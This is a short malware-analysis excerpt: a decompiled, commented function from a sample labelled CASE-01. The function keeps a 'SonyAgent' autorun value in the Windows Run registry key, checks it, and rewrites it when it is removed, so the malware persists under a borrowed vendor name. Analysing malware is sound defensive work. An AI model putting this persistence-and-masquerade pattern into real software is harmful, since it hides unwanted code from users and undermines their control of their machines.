/* CASE-01 — persistence installer, decompiled by Vivarium (Ghidra).
   Writes HKLM/HKCU SOFTWARE\Microsoft\Windows\CurrentVersion\Run value "SonyAgent"
   -> own image path; reads back + compares, rewrites if missing/changed
   (self-healing autorun). Masquerades under the "Sony" name. */
void __cdecl FUN_00440553(undefined4 hive, std::string *own_path) {
  std::string cur;
  bool ok = FUN_0040621c(hive, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                         "SonyAgent", cur);          // read current value
  if (!ok || cur.compare(*own_path) != 0)
      FUN_00406191(hive, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                   "SonyAgent", own_path);            // (re)write autorun
  return;
}
